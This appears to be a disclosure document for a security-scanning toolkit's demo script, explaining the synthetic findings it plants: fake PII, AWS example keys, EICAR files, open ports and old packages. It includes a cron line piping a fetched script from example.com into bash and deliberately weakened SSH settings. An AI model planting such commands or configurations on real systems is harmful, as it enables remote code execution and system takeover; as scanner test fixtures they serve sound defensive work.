# Demo Planted Findings — Security Disclosure

## Purpose

The Security Verification Toolkit includes a demo preparation script (`scripts/prepare-demo-target.sh`) that intentionally places **synthetic security findings** on a target system. This document explains what is planted, why, and confirms that none of this data is real or poses a security risk.

## Why Planted Findings Exist

Security scanning tools are difficult to demonstrate on clean systems — a scan with zero findings doesn't show the tool's capabilities. The `prepare-demo-target.sh` script creates a controlled set of realistic-looking (but entirely fake) findings so that every scan type produces meaningful output during demonstrations.

**This is standard practice** in security tooling. Products like Nessus, Qualys, and OpenSCAP all ship with similar test fixtures and demo environments.

## Setup Phases

The script runs 8 phases, each producing findings for different scan types:

| Phase | What | Randomized? | Scan That Detects It |
|-------|------|-------------|---------------------|
| 1. SSH Server | PasswordAuth=yes, PermitRoot=yes | No (fixed config) | Host security check, Lynis |
| 2. Scan Dependencies | Installs ClamAV, Lynis, nmap, zip | No (install) | — |
| 3. Attack Surface | HTTP on random port + 5 random listener ports | **Yes** | Nmap port scan |
| 4. Planted Findings | PII records (3-7 random), MAC addrs (3-6 random), secrets, cron jobs | **Yes** | PII, secrets, MAC, host security |
| 5. Malware Samples | 3-7 EICAR files in random subdirs with random names + 1 ZIP | **Yes** | ClamAV malware scan |
| 6. Outdated Software | Firefox, Chromium from ISO repos | No (version from ISO) | NVD CVE scan |
| 7. KEV Triggers | Apache2, log4j, imagemagick, polkit + version manifest | No (install) | CISA KEV check |
| 8. Verification Manifest | Full manifest of everything planted, with checksums | Auto | — (for verification) |

Randomization ensures each demo run produces different finding counts and file locations, demonstrating that the scanner is performing real detection — not matching a fixed script.

All actions are logged to `/tmp/demo-target-setup.log` with timestamps.

## What Is Planted

### Phase 4: PII Test Data (`customer-records.csv`)

Records are randomly generated each run (3-7 records) from pools of placeholder names.

| Data Type | Example | Real? |
|-----------|---------|-------|
| SSNs | Randomly generated `XXX-XX-XXXX` patterns | **No** — Random digits in SSN format. None are issued SSNs. |
| Phone numbers | `555-XXX-XXXX` | **No** — 555 prefix is reserved for fictional use by NANPA. |
| Credit cards | Randomly generated 16-digit numbers | **No** — Random digits, not issued by any bank. |
| Email addresses | `firstname@example.com` | **No** — `example.com` is an IANA-reserved domain (RFC 2606). |
| Names | From pool: John, Jane, Bob, Alice, Carlos, Sarah, David, Maria | **No** — Standard placeholder names. |

### Phase 4: Secrets Test Data (`config.env`)

| Secret Type | Example | Real? |
|-------------|---------|-------|
| AWS Access Key | `AKIAIOSFODNN7EXAMPLE` | **No** — AWS's official example key from their documentation. It has never been and will never be a valid key. |
| AWS Secret Key | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | **No** — AWS's official example secret key. |
| GitHub Token | `ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12` | **No** — Alphabetical sequence, not a valid token. |
| Database URL | `postgres://admin:SuperSecret123!@db.example.com` | **No** — Points to `example.com` (reserved domain). |
| API Key | `sk-proj-abc123def456...` | **No** — Sequential placeholder. |
| Password | `Admin@2024!` | **No** — Generic demo string, not used anywhere. |

### Phase 4: Private Key (`deploy-key.pem`)

The planted RSA private key contains the string `EXAMPLE_NOT_A_REAL_KEY_JUST_DEMO_DATA_FOR_SCAN` in its body. It is **structurally invalid** — it cannot be used for any cryptographic operation. It exists solely to trigger the toolkit's private key detection pattern.

### Phase 4: MAC Addresses (`network-inventory.txt`)

Randomly generated each run (3-6 addresses) using random hex octets. Example formats:

| Address | Real? |
|---------|-------|
| `XX:XX:XX:XX:XX:XX` (random hex) | **No** — Randomly generated, not tied to any hardware. |

### Phase 4: Database Dump (`users-backup.sql`)

Contains fake SSNs (same invalid pool) and a fake API key (`sk-live-EXAMPLE-KEY-NOT-REAL-12345`). The password hashes are truncated bcrypt strings that cannot be reversed to any real password.

### Phase 4: Suspicious Cron Jobs and World-Writable Files

- A cron entry running `curl http://example.com/check | bash` — points to IANA reserved domain, will never execute real code
- A world-writable file (`chmod 777`) for host security findings

### Phase 5: EICAR Malware Test Files

The [EICAR test file](https://www.eicar.org/download-anti-malware-testfile/) is an **industry-standard antivirus test string** developed by the European Institute for Computer Antivirus Research. It is:

- **Not malware** — it contains no executable code and cannot harm any system
- **Recognized by every antivirus product** as a test signature
- **Designed specifically** for testing AV detection capabilities
- **68 bytes of ASCII text** — literally just a string

The EICAR standard explicitly states: *"Any anti-virus product that detects the EICAR test file must treat it exactly as if it found a real virus."*

Each demo run plants **3-7 EICAR files** with random names (from a pool of realistic-looking filenames like `update.exe`, `invoice.doc.exe`) in random subdirectories (like `downloads/`, `temp/`, `.hidden/`). One additional ZIP-wrapped EICAR tests archive scanning capabilities.

A `malware-samples.txt` manifest records every planted sample with SHA256 checksums.

### Phase 1: Weak SSH Configuration

The script sets `PermitRootLogin yes` and `PasswordAuthentication yes` on the demo target. This is:

- **Intentional** — creates a finding for the host security check and Lynis audit
- **Reverted on cleanup** — `--cleanup` flag restores the original config
- **Ephemeral** — designed for live boot environments that reset on reboot

### Phase 3: Open Ports

5 random ports (1024-65535) are opened with simple echo listeners, plus an HTTP server on a random port. Ports are randomized each run to demonstrate real detection. A `port-manifest.txt` records which ports were opened for verification.

### Phase 6: Outdated Software

Firefox and Chromium are installed from the Ubuntu ISO's bundled repositories. On a live boot, these will be the version shipped with the ISO — typically months behind current releases, producing CVE findings during NVD scans.

### Phase 7: KEV-Trigger Packages

Packages commonly listed in CISA's Known Exploited Vulnerabilities catalog are installed:

| Package | Why |
|---------|-----|
| `apache2` | Frequently has KEV-listed CVEs; also provides port 80 for nmap |
| `liblog4j2-java` | Log4Shell (CVE-2021-44228) if ISO version is old enough |
| `imagemagick` | Multiple historical KEV entries |
| `polkit` | PwnKit (CVE-2021-4034) if ISO version is old enough |

A `kev-trigger-packages.txt` manifest records installed versions for verification.

### Phase 8: Verification Manifest

`MANIFEST.txt` provides a complete inventory of everything planted — ports, PII patterns, secrets, malware samples, MAC addresses, host security weaknesses, and KEV-trigger packages. Compare this against `.scans/` output to verify detection coverage.

## Lifecycle

```
prepare-demo-target.sh              prepare-demo-target.sh --cleanup
        │                                       │
        ▼                                       ▼
  Phase 1: Weakens SSH config            Restores SSH config
  Phase 2: Installs scan deps            (deps left — harmless)
  Phase 3: Opens random ports            Kills all listeners
  Phase 4: Plants PII/secrets/MAC        Deletes all planted files
  Phase 5: Plants EICAR samples          Deletes all planted files
  Phase 6: Installs old browsers         (left — harmless)
  Phase 7: Installs KEV packages         Stops Apache
  Phase 8: Generates manifest            Removes crontab
        │                                       │
        ▼                                       ▼
  Demo scans run against planted data    System returns to pre-demo state
```

On a live boot system, rebooting fully resets everything regardless of cleanup.

All setup actions are logged to `/tmp/demo-target-setup.log`.

## How to Verify

To confirm that planted data is not real:

```bash
# AWS keys: Official AWS example credentials
# https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html

# EICAR: Official test file documentation
# https://www.eicar.org/download-anti-malware-testfile/

# example.com: IANA reserved domain
# https://www.iana.org/domains/reserved

# 555 phone prefix: NANPA fictional use
# https://en.wikipedia.org/wiki/555_(telephone_number)

# Compare planted vs detected:
diff <(cat /tmp/demo-target-data/MANIFEST.txt) <(ls .scans/)
```

## For Auditors

If you are reviewing this toolkit as part of a security assessment:

1. **The planted findings are test fixtures**, equivalent to unit test data in any software project
2. **No real credentials exist** anywhere in this repository — AWS keys are official example keys, tokens are alphabetical sequences
3. **The EICAR files are not malware** — they are the industry-standard AV test string (68 bytes of ASCII)
4. **All planted data is marked** with comments like `# DEMO DATA - NOT REAL` and `EXAMPLE_NOT_A_REAL_KEY`
5. **The plant script is self-cleaning** via `--cleanup` flag or system reboot
6. **The repository passes its own scans** — running the toolkit against itself produces only the expected findings from these test fixtures and known allowlisted items
7. **Verification manifests** (`MANIFEST.txt`, `malware-samples.txt`, `kev-trigger-packages.txt`, `port-manifest.txt`) document exactly what was planted for full traceability
8. **Session logging** at `/tmp/demo-target-setup.log` captures every action with timestamps

## Related Files

- `scripts/prepare-demo-target.sh` — The planting script
- `demo/vulnerable-lab/` — Docker Compose vulnerable lab (separate from planted findings)
- `.allowlists/` — Allowlist entries for known-good matches in the codebase
- `docs/DEMO-CHEAT-SHEET.md` — Demo walkthrough guide
